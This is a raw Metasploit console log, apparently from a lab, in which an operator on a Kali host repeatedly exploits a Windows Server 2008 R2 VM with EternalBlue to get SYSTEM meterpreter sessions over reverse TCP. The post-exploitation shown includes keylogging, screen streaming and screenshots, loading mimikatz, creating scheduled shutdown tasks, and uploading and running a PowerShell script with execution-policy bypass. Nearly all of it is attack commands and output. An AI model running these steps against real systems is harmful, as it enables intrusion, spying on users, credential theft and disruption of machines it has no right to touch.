@@ -1,0 +1,721 @@
+[0m[1m[31m[-][0m Invalid session identifier: <id>
+[0m[1m[31m[-][0m Unknown command: keyscan_dump. Run the [32mhelp[0m command for more details.
+[?1034h[4mmsf[0m [0m> Interrupt: use the 'exit' command to quit
+[4mmsf[0m [0m> Interrupt: use the 'exit' command to quit
+[4mmsf[0m [0m> Interrupt: use the 'exit' command to quit
+[4mmsf[0m [0m> 
+[0m[4mmsf[0m [0m> 
+[0m[4mmsf[0m [0m> art[Popdumpstop
+[0mStopping the keystroke sniffer...
+[4mmeterpreter[0m > 
+[1m[34m[*][0m 192.168.56.104 - Meterpreter session 6 closed.  Reason: Died
+Interrupt: use the 'exit' command to quit
+[4mmeterpreter[0m > background
+[0m[1m[34m[*][0m Backgrounding session 6...
+[4mmsf[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> sessions -l
+[0m
+Active sessions
+===============
+
+No active sessions.
+
+[4mmsf[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> sessions -lrun[KRUNset SESSION 1
+[0mSESSION => 1
+[4mmsf[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> set SESSION 1[P[Pssions -lrun[K
+[0m[1m[34m[*][0m Started reverse TCP handler on 192.168.56.103:444 
+[1m[34m[*][0m 192.168.56.104:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
+[1m[32m[+][0m 192.168.56.104:445    - Host is likely VULNERABLE to MS17-010! - Windows Server 2008 R2 Standard 7601 Service Pack 1 x64 (64-bit)
+[1m[34m[*][0m 192.168.56.104:445    - Scanned 1 of 1 hosts (100% complete)
+[1m[32m[+][0m 192.168.56.104:445 - The target is vulnerable.
+[1m[34m[*][0m 192.168.56.104:445 - Connecting to target for exploitation.
+[1m[32m[+][0m 192.168.56.104:445 - Connection established for exploitation.
+[1m[32m[+][0m 192.168.56.104:445 - Target OS selected valid for OS indicated by SMB reply
+[1m[34m[*][0m 192.168.56.104:445 - CORE raw buffer dump (51 bytes)
+[1m[34m[*][0m 192.168.56.104:445 - 0x00000000  57 69 6e 64 6f 77 73 20 53 65 72 76 65 72 20 32  Windows Server 2
+[1m[34m[*][0m 192.168.56.104:445 - 0x00000010  30 30 38 20 52 32 20 53 74 61 6e 64 61 72 64 20  008 R2 Standard 
+[1m[34m[*][0m 192.168.56.104:445 - 0x00000020  37 36 30 31 20 53 65 72 76 69 63 65 20 50 61 63  7601 Service Pac
+[1m[34m[*][0m 192.168.56.104:445 - 0x00000030  6b 20 31                                         k 1             
+[1m[32m[+][0m 192.168.56.104:445 - Target arch selected valid for arch indicated by DCE/RPC reply
+[1m[34m[*][0m 192.168.56.104:445 - Trying exploit with 12 Groom Allocations.
+[1m[34m[*][0m 192.168.56.104:445 - Sending all but last fragment of exploit packet
+[1m[34m[*][0m 192.168.56.104:445 - Starting non-paged pool grooming
+[1m[32m[+][0m 192.168.56.104:445 - Sending SMBv2 buffers
+[1m[32m[+][0m 192.168.56.104:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
+[1m[34m[*][0m 192.168.56.104:445 - Sending final SMBv2 buffers.
+[1m[34m[*][0m 192.168.56.104:445 - Sending last fragment of exploit packet!
+[1m[34m[*][0m 192.168.56.104:445 - Receiving response from exploit packet
+[1m[32m[+][0m 192.168.56.104:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
+[1m[34m[*][0m 192.168.56.104:445 - Sending egg to corrupted connection.
+[1m[34m[*][0m 192.168.56.104:445 - Triggering free of corrupted buffer.
+[1m[31m[-][0m 192.168.56.104:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[1m[31m[-][0m 192.168.56.104:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=FAIL-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[1m[31m[-][0m 192.168.56.104:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[1m[34m[*][0m 192.168.56.104:445 - Connecting to target for exploitation.
+[1m[32m[+][0m 192.168.56.104:445 - Connection established for exploitation.
+[1m[32m[+][0m 192.168.56.104:445 - Target OS selected valid for OS indicated by SMB reply
+[1m[34m[*][0m 192.168.56.104:445 - CORE raw buffer dump (51 bytes)
+[1m[34m[*][0m 192.168.56.104:445 - 0x00000000  57 69 6e 64 6f 77 73 20 53 65 72 76 65 72 20 32  Windows Server 2
+[1m[34m[*][0m 192.168.56.104:445 - 0x00000010  30 30 38 20 52 32 20 53 74 61 6e 64 61 72 64 20  008 R2 Standard 
+[1m[34m[*][0m 192.168.56.104:445 - 0x00000020  37 36 30 31 20 53 65 72 76 69 63 65 20 50 61 63  7601 Service Pac
+[1m[34m[*][0m 192.168.56.104:445 - 0x00000030  6b 20 31                                         k 1             
+[1m[32m[+][0m 192.168.56.104:445 - Target arch selected valid for arch indicated by DCE/RPC reply
+[1m[34m[*][0m 192.168.56.104:445 - Trying exploit with 17 Groom Allocations.
+[1m[34m[*][0m 192.168.56.104:445 - Sending all but last fragment of exploit packet
+[1m[34m[*][0m 192.168.56.104:445 - Starting non-paged pool grooming
+[1m[32m[+][0m 192.168.56.104:445 - Sending SMBv2 buffers
+[1m[32m[+][0m 192.168.56.104:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
+[1m[34m[*][0m 192.168.56.104:445 - Sending final SMBv2 buffers.
+[1m[34m[*][0m 192.168.56.104:445 - Sending last fragment of exploit packet!
+[1m[34m[*][0m 192.168.56.104:445 - Receiving response from exploit packet
+[1m[32m[+][0m 192.168.56.104:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
+[1m[34m[*][0m 192.168.56.104:445 - Sending egg to corrupted connection.
+[1m[34m[*][0m 192.168.56.104:445 - Triggering free of corrupted buffer.
+[1m[34m[*][0m Sending stage (230982 bytes) to 192.168.56.104
+[0m[0m[1m[32m[+][0m 192.168.56.104:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[1m[32m[+][0m 192.168.56.104:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[1m[32m[+][0m 192.168.56.104:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[1m[34m[*][0m Meterpreter session 7 opened (192.168.56.103:444 -> 192.168.56.104:49291) at 2026-08-15 18:41:35 -0400
+
+[0m[4mmeterpreter[0m > backgroundkeyscan_stopdumpstart[Popdumpstart[Pmigrate 4568show optionsmigrate 4568ps[Kbackground[P[P[P[P[P[Phelpspool /root/keylog_evidencia.txt[C[C[C[C[C[C[C[C[C[C[C[C[C[C[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[Pwebcam_snapliststream[P[Pscreenshare
+[0m[1m[34m[*][0m Preparing player...
+[1m[34m[*][0m Opening player at: /home/kali/FbcWAygr.html
+[1m[34m[*][0m Streaming...
+[1m[31m[-][0m screenshare: Interrupted
+[4mmeterpreter[0m > uubb[K[K[K[Kbackground
+[0m[1m[34m[*][0m Backgrounding session 7...
+[4mmsf[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> nano /home/kali/apagado_tarea.rc
+[0m[1m[34m[*][0m exec: nano /home/kali/apagado_tarea.rc
+
+[4mmsf[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> crontab -e
+[0m[1m[34m[*][0m exec: crontab -e
+
+[4mmsf[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> crontab -l
+[0m[1m[34m[*][0m exec: crontab -l
+
+[4mmsf[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> sudo service cron status
+[0m[1m[34m[*][0m exec: sudo service cron status
+
+[4mmsf[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> sessions -l
+[0m
+Active sessions
+===============
+
+  Id  Name  Type                     Information                Connection
+  --  ----  ----                     -----------                ----------
+  7         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ VAG  192.168.56.103:444 -> 192.
+                                     RANT-2008R2                168.56.104:49291 (192.168.
+                                                                56.104)
+
+[4mmsf[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> [K[4mmsf[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> [K[4mmsf[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> grep CRON /var/log/syslog | tail -20
+[0m[1m[31m[-][0m Unknown command: '/var/log/syslog'.
+[4mmsf[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> sessions -l
+[0m
+Active sessions
+===============
+
+  Id  Name  Type                     Information                Connection
+  --  ----  ----                     -----------                ----------
+  7         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ VAG  192.168.56.103:444 -> 192.
+                                     RANT-2008R2                168.56.104:49291 (192.168.
+                                                                56.104)
+
+[4mmsf[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> load msgrpc Pass=1234 ServerPort=55553
+[0m[1m[34m[*][0m MSGRPC Service:  127.0.0.1:55553 
+[1m[34m[*][0m MSGRPC Username: msf
+[1m[34m[*][0m MSGRPC Password: 1234
+[1m[34m[*][0m Successfully loaded plugin: msgrpc
+[4mmsf[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> load msgrpc Pass=1234 ServerPort=55553
+[0m[1m[34m[*][0m MSGRPC Service:  127.0.0.1:55553 
+[1m[34m[*][0m MSGRPC Username: msf
+[1m[34m[*][0m MSGRPC Password: 1234
+[1m[34m[*][0m Successfully loaded plugin: msgrpc
+[4mmsf[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> sessions -i 7
+[0m[1m[34m[*][0m Starting interaction with 7...
+
+[4mmeterpreter[0m > screenshot -p /home/kali/captura_preapagado.png
+[0mScreenshot saved to: /home/kali/captura_preapagado.png
+[4mmeterpreter[0m > execute -f cmd.exe -a "/c schtasks /create /tn \"Apagado\" /tr \"shutdown /s / t 0\" /sc once /st 20:00 /f"[C[P /f"[P /f"2 /f"0 /f"[C[C[P[P1:20 /f"9:20 /f"[C[C[C[C[C[C[C
+[0mProcess 4724 created.
+[4mmeterpreter[0m > execute -f cmd.exe -a "/c schtasks /query /tn \"Apagado\""
+[0mProcess 6092 created.
+[4mmeterpreter[0m > execute -f cmd.exe -a "/c time /t"
+[0mProcess 5816 created.
+[4mmeterpreter[0m > execute -f cmd.exe -a "/c schtasks /query /tn \"Apagado\" /fo LIST"
+[0mProcess 1300 created.
+[4mmeterpreter[0m > execute -f cmd.exe -a "/c schtasks /query /tn \"Apagado\" /fo LIST"[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[Kexecute -f cmd.exe -a "/c time /t" -o
+[0mProcess 2516 created.
+[4mmeterpreter[0m > execute -f cmd.exe -a "/c schtasks /query /tn \"Apagado\" /fo LIST" -o
+[0mProcess 1764 created.
+[4mmeterpreter[0m > execute -f cmd.exe -a "/c schtasks /delete /tn \"Apagado\" /f" -o
+[0mProcess 4520 created.
+[4mmeterpreter[0m > execute -f cmd.exe -a "/c schtasks /create /tn \"Apagado\" /tr \"shutdown /s / t 0\" /sc once /st 16:30 /f" -o[C[P[P2 /f" -o5 /f" -o
+[0mProcess 3416 created.
+[4mmeterpreter[0m > execute -f cmd.exe -a "/c schtasks /query /tn \"Apagado\" /fo LIST" -o
+[0mProcess 528 created.
+[4mmeterpreter[0m > meterpreter > shell[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[Kshell
+[0mProcess 6048 created.
+Channel 1 created.
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32>time /t
+04:30 PM
+
+C:\Windows\system32>
+Terminate channel 1? [y/N]  [4mmeterpreter[0m > meterpreter > sysinfo
+[0m[1m[31m[-][0m Unknown command: meterpreter. Run the [32mhelp[0m command for more details.
+[4mmeterpreter[0m > meterpreter > sysinfo[Psysinfo[Psysinfo[Psysinfo[Psysinfo[Psysinfo[Psysinfo[Psysinfo[Psysinfo[Psysinfo[Psysinfo[Psysinfo[Psysinfo[Psysinfo[Psysinfo
+[0mComputer        : VAGRANT-2008R2
+OS              : Windows Server 2008 R2 (6.1 Build 7601, Service Pack 1).
+Architecture    : x64
+System Language : en_US
+Domain          : WORKGROUP
+Logged On Users : 2
+Meterpreter     : x64/windows
+[4mmeterpreter[0m > load kiwi
+[0mLoading extension kiwi...
+  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
+  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/
+
+Success.
+[4mmeterpreter[0m > 
+[1m[34m[*][0m 192.168.56.104 - Meterpreter session 7 closed.  Reason: Died
+c
+[0m[1m[31m[-][0m Unknown command: c. Did you mean [32mcp[0m? Run the [32mhelp[0m command for more details.
+[4mmsf[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> sessions -i 7load msgrpc Pass=1234 ServerPort=55553[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[Psessions -i 7load msgrpc Pass=1234 ServerPort=55553sessions -l[Kgrep CRON /var/log/syslog | tail -20sessions -l[Kudo service cron status[P[P[P[P[P[P[P[P[P[P[P[P[P[Pcrontab -lenano /home/kali/apagado_tarea.rcrun[Kset SESSION 1
+[0mSESSION => 1
+[4mmsf[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> set SESSION 1ssions -i 7t SESSION 1[Krun
+[0m[1m[34m[*][0m Started reverse TCP handler on 192.168.56.103:444 
+[1m[34m[*][0m 192.168.56.104:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
+[1m[32m[+][0m 192.168.56.104:445    - Host is likely VULNERABLE to MS17-010! - Windows Server 2008 R2 Standard 7601 Service Pack 1 x64 (64-bit)
+[1m[34m[*][0m 192.168.56.104:445    - Scanned 1 of 1 hosts (100% complete)
+[1m[32m[+][0m 192.168.56.104:445 - The target is vulnerable.
+[1m[34m[*][0m 192.168.56.104:445 - Connecting to target for exploitation.
+[1m[32m[+][0m 192.168.56.104:445 - Connection established for exploitation.
+[1m[32m[+][0m 192.168.56.104:445 - Target OS selected valid for OS indicated by SMB reply
+[1m[34m[*][0m 192.168.56.104:445 - CORE raw buffer dump (51 bytes)
+[1m[34m[*][0m 192.168.56.104:445 - 0x00000000  57 69 6e 64 6f 77 73 20 53 65 72 76 65 72 20 32  Windows Server 2
+[1m[34m[*][0m 192.168.56.104:445 - 0x00000010  30 30 38 20 52 32 20 53 74 61 6e 64 61 72 64 20  008 R2 Standard 
+[1m[34m[*][0m 192.168.56.104:445 - 0x00000020  37 36 30 31 20 53 65 72 76 69 63 65 20 50 61 63  7601 Service Pac
+[1m[34m[*][0m 192.168.56.104:445 - 0x00000030  6b 20 31                                         k 1             
+[1m[32m[+][0m 192.168.56.104:445 - Target arch selected valid for arch indicated by DCE/RPC reply
+[1m[34m[*][0m 192.168.56.104:445 - Trying exploit with 12 Groom Allocations.
+[1m[34m[*][0m 192.168.56.104:445 - Sending all but last fragment of exploit packet
+[1m[34m[*][0m 192.168.56.104:445 - Starting non-paged pool grooming
+[1m[32m[+][0m 192.168.56.104:445 - Sending SMBv2 buffers
+[1m[32m[+][0m 192.168.56.104:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
+[1m[34m[*][0m 192.168.56.104:445 - Sending final SMBv2 buffers.
+[1m[34m[*][0m 192.168.56.104:445 - Sending last fragment of exploit packet!
+[1m[34m[*][0m 192.168.56.104:445 - Receiving response from exploit packet
+[1m[32m[+][0m 192.168.56.104:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
+[1m[34m[*][0m 192.168.56.104:445 - Sending egg to corrupted connection.
+[1m[34m[*][0m 192.168.56.104:445 - Triggering free of corrupted buffer.
+[1m[34m[*][0m Sending stage (230982 bytes) to 192.168.56.104
+[0m[0m[1m[32m[+][0m 192.168.56.104:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[1m[32m[+][0m 192.168.56.104:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[1m[32m[+][0m 192.168.56.104:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[1m[34m[*][0m Meterpreter session 8 opened (192.168.56.103:444 -> 192.168.56.104:49267) at 2026-08-15 19:42:47 -0400
+
+[0m[4mmeterpreter[0m > 
+[1m[34m[*][0m 192.168.56.104 - Meterpreter session 8 closed.  Reason: Died
+Interrupt: use the 'exit' command to quit
+[4mmeterpreter[0m > cload kiwi[P[Psysinfoload kiwic[K[Kbackground
+[0m[1m[34m[*][0m Backgrounding session 8...
+[4mmsf[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> runset SESSION 1
+[0mSESSION => 1
+[4mmsf[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> set SESSION 1run[K
+[0m[1m[34m[*][0m Started reverse TCP handler on 192.168.56.103:444 
+[1m[34m[*][0m 192.168.56.104:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
+[1m[32m[+][0m 192.168.56.104:445    - Host is likely VULNERABLE to MS17-010! - Windows Server 2008 R2 Standard 7601 Service Pack 1 x64 (64-bit)
+[1m[34m[*][0m 192.168.56.104:445    - Scanned 1 of 1 hosts (100% complete)
+[1m[32m[+][0m 192.168.56.104:445 - The target is vulnerable.
+[1m[34m[*][0m 192.168.56.104:445 - Connecting to target for exploitation.
+[1m[32m[+][0m 192.168.56.104:445 - Connection established for exploitation.
+[1m[32m[+][0m 192.168.56.104:445 - Target OS selected valid for OS indicated by SMB reply
+[1m[34m[*][0m 192.168.56.104:445 - CORE raw buffer dump (51 bytes)
+[1m[34m[*][0m 192.168.56.104:445 - 0x00000000  57 69 6e 64 6f 77 73 20 53 65 72 76 65 72 20 32  Windows Server 2
+[1m[34m[*][0m 192.168.56.104:445 - 0x00000010  30 30 38 20 52 32 20 53 74 61 6e 64 61 72 64 20  008 R2 Standard 
+[1m[34m[*][0m 192.168.56.104:445 - 0x00000020  37 36 30 31 20 53 65 72 76 69 63 65 20 50 61 63  7601 Service Pac
+[1m[34m[*][0m 192.168.56.104:445 - 0x00000030  6b 20 31                                         k 1             
+[1m[32m[+][0m 192.168.56.104:445 - Target arch selected valid for arch indicated by DCE/RPC reply
+[1m[34m[*][0m 192.168.56.104:445 - Trying exploit with 12 Groom Allocations.
+[1m[34m[*][0m 192.168.56.104:445 - Sending all but last fragment of exploit packet
+[1m[34m[*][0m Sending stage (230982 bytes) to 192.168.56.104
+[0m[0m[0m[0m[1m[34m[*][0m Meterpreter session 9 opened (192.168.56.103:444 -> 192.168.56.104:49388) at 2026-08-15 20:00:41 -0400
+[1m[31m[-][0m 192.168.56.104:445 - RubySMB::Error::CommunicationError: RubySMB::Error::CommunicationError
+
+[0m[4mmeterpreter[0m > backgroundc[Kload kiwi[P[Psysinfometerpreter > sysinfo[C[C[C[C[C[C[C[C[C[C[C[C[C[C[P[P[P[P[P[P[P[P[P[P[P[P[P[Psysinfoload kiwic[Kbackground[Kbackgroundc[Kload kiwi[P[Psysinfometerpreter > sysinfo[C[C[C[C[C[C[C[C[C[C[C[C[C[Cshell[Kexecute -f cmd.exe -a "/c schtasks /query /tn \"Apagado\" /fo LIST" -ocreate /tn \"Apagado\" /tr \"shutdown /s /tt 0\" /sc once /st 16:25 /f" -o[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[P[P[P[P[P[P[P[P[P[P[P[P[Pdelete /tn \"Apagado\" /f" -o
+[K[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cquery /tn \"Apagado\" /fo LIST" -o[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Ctime /t" -o[Kschtasks /query /tn \"Apagado\" /fo LIST"time /t"[Kschtasks /query /tn \"Apagado\""create /tn \"Apagado\" /tr \"shutdown /s /tt 0\" /sc once /st 19:20 /f"[A[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[Pscreenshot -p /home/kali/captura_preapagado.png
+[K[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cbackground[Kscreenshare[Pbackgroundscreenshare
+[0m[1m[34m[*][0m Preparing player...
+[1m[34m[*][0m Opening player at: /home/kali/GouUdRlS.html
+[1m[34m[*][0m Streaming...
+[1m[31m[-][0m screenshare: Interrupted
+[4mmeterpreter[0m > 
+[1m[34m[*][0m 192.168.56.104 - Meterpreter session 9 closed.  Reason: Died
+Interrupt: use the 'exit' command to quit
+[4mmeterpreter[0m > screenshare[Pbackground
+[0m[1m[34m[*][0m Backgrounding session 9...
+[4mmsf[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> runset SESSION 1
+[0mSESSION => 1
+[4mmsf[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> set SESSION 1run[K
+[0m[1m[34m[*][0m Started reverse TCP handler on 192.168.56.103:444 
+[1m[34m[*][0m 192.168.56.104:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
+[1m[32m[+][0m 192.168.56.104:445    - Host is likely VULNERABLE to MS17-010! - Windows Server 2008 R2 Standard 7601 Service Pack 1 x64 (64-bit)
+[1m[34m[*][0m 192.168.56.104:445    - Scanned 1 of 1 hosts (100% complete)
+[1m[32m[+][0m 192.168.56.104:445 - The target is vulnerable.
+[1m[34m[*][0m 192.168.56.104:445 - Connecting to target for exploitation.
+[1m[32m[+][0m 192.168.56.104:445 - Connection established for exploitation.
+[1m[32m[+][0m 192.168.56.104:445 - Target OS selected valid for OS indicated by SMB reply
+[1m[34m[*][0m 192.168.56.104:445 - CORE raw buffer dump (51 bytes)
+[1m[34m[*][0m 192.168.56.104:445 - 0x00000000  57 69 6e 64 6f 77 73 20 53 65 72 76 65 72 20 32  Windows Server 2
+[1m[34m[*][0m 192.168.56.104:445 - 0x00000010  30 30 38 20 52 32 20 53 74 61 6e 64 61 72 64 20  008 R2 Standard 
+[1m[34m[*][0m 192.168.56.104:445 - 0x00000020  37 36 30 31 20 53 65 72 76 69 63 65 20 50 61 63  7601 Service Pac
+[1m[34m[*][0m 192.168.56.104:445 - 0x00000030  6b 20 31                                         k 1             
+[1m[32m[+][0m 192.168.56.104:445 - Target arch selected valid for arch indicated by DCE/RPC reply
+[1m[34m[*][0m 192.168.56.104:445 - Trying exploit with 12 Groom Allocations.
+[1m[34m[*][0m 192.168.56.104:445 - Sending all but last fragment of exploit packet
+[1m[34m[*][0m Sending stage (230982 bytes) to 192.168.56.104
+[0m[1m[34m[*][0m 192.168.56.104:445 - Starting non-paged pool grooming
+[1m[32m[+][0m 192.168.56.104:445 - Sending SMBv2 buffers
+[1m[32m[+][0m 192.168.56.104:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
+[1m[34m[*][0m 192.168.56.104:445 - Sending final SMBv2 buffers.
+[1m[34m[*][0m 192.168.56.104:445 - Sending last fragment of exploit packet!
+[1m[34m[*][0m 192.168.56.104:445 - Receiving response from exploit packet
+[1m[32m[+][0m 192.168.56.104:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
+[1m[34m[*][0m 192.168.56.104:445 - Sending egg to corrupted connection.
+[1m[34m[*][0m 192.168.56.104:445 - Triggering free of corrupted buffer.
+[0m[1m[34m[*][0m Sending stage (230982 bytes) to 192.168.56.104
+[0m[0m[0m[0m[1m[32m[+][0m 192.168.56.104:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[1m[32m[+][0m 192.168.56.104:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[1m[32m[+][0m 192.168.56.104:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[1m[34m[*][0m Meterpreter session 11 opened (192.168.56.103:444 -> 192.168.56.104:49625) at 2026-08-15 20:12:24 -0400
+
+[0m[4mmeterpreter[0m > [1m[34m[*][0m Meterpreter session 10 opened (192.168.56.103:444 -> 192.168.56.104:49595) at 2026-08-15 20:12:25 -0400
+
+[0m[4mmeterpreter[0m > upload /home/kali/apagado.ps1 C:\\Users\\Public\\apagado.ps1
+[0m[1m[34m[*][0m Uploading  : /home/kali/apagado.ps1 -> C:\Users\Public\apagado.ps1
+[1m[34m[*][0m Uploaded 637.00 B of 637.00 B (100.0%): /home/kali/apagado.ps1 -> C:\Users\Public\apagado.ps1
+[1m[34m[*][0m Completed  : /home/kali/apagado.ps1 -> C:\Users\Public\apagado.ps1
+[4mmeterpreter[0m > ls C:\\Users\\Public\\
+[0mListing: C:\Users\Public\
+=========================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+040555/r-xr-xr-x  0     dir   2023-03-19 05:21:54 -0400  Desktop
+040555/r-xr-xr-x  4096  dir   2023-03-19 05:45:00 -0400  Documents
+040555/r-xr-xr-x  0     dir   2009-07-14 00:57:55 -0400  Downloads
+040555/r-xr-xr-x  0     dir   2009-07-13 22:34:59 -0400  Favorites
+040555/r-xr-xr-x  0     dir   2009-07-14 00:57:55 -0400  Libraries
+040555/r-xr-xr-x  0     dir   2023-03-19 05:45:00 -0400  Music
+040555/r-xr-xr-x  0     dir   2023-03-19 05:45:00 -0400  Pictures
+040555/r-xr-xr-x  0     dir   2009-07-14 00:57:55 -0400  Videos
+100666/rw-rw-rw-  637   fil   2026-08-15 20:12:51 -0400  apagado.ps1
+100666/rw-rw-rw-  174   fil   2009-07-14 00:57:55 -0400  desktop.ini
+
+[4mmeterpreter[0m > [K[4mmeterpreter[0m > [K[4mmeterpreter[0m > C:\Users\Public\apagado.ps1
+[0m[1m[31m[-][0m Unknown command: C:UsersPublicapagado.ps1. Run the [32mhelp[0m command for more details.
+[4mmeterpreter[0m > shell
+[0mProcess 4936 created.
+Channel 2 created.
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32>powershell -command "Get-Date"
+
+Saturday, August 15, 2026 5:14:19 PM
+
+
+
+C:\Windows\system32>exit
+[4mmeterpreter[0m > upload /home/kali/apagado.ps1 C:\\Users\\Public\\apagado.ps1
+[0m[1m[34m[*][0m Uploading  : /home/kali/apagado.ps1 -> C:\Users\Public\apagado.ps1
+[1m[34m[*][0m Uploaded 637.00 B of 637.00 B (100.0%): /home/kali/apagado.ps1 -> C:\Users\Public\apagado.ps1
+[1m[34m[*][0m Completed  : /home/kali/apagado.ps1 -> C:\Users\Public\apagado.ps1
+[4mmeterpreter[0m > ls C:\\Users\\Public\\apagado.ps1
+[0m100666/rw-rw-rw-  637  fil  2026-08-15 20:16:06 -0400  C:\Users\Public\apagado.ps1
+[4mmeterpreter[0m > execute -f powershell.exe -a "-ExecutionPolicy Bypass -File C:\Users\Public\ apagado.ps1"
+[0mProcess 1056 created.
+[4mmeterpreter[0m > execute -f powershell.exe -a "-ExecutionPolicy Bypass -File C:\Users\Public\aapagado.ps1"[A[4mmeterpreter[0m > [P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[Pls C:\\Users\\Public\\apagado.ps1
+[K[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cexecute -f powershell.exe -a "-ExecutionPolicy Bypass -File C:\Users\Public\aapagado.ps1"
+[0mProcess 612 created.
+[4mmeterpreter[0m > execute -f powershell.exe -a "-ExecutionPolicy Bypass -File C:\Users\Public\aapagado.ps1"
+[0mProcess 1428 created.
+[4mmeterpreter[0m > execute -f powershell.exe -a "-ExecutionPolicy Bypass -File C:\Users\Public\aapagado.ps1"
+[0mProcess 2268 created.
+[4mmeterpreter[0m > ps
+[0m
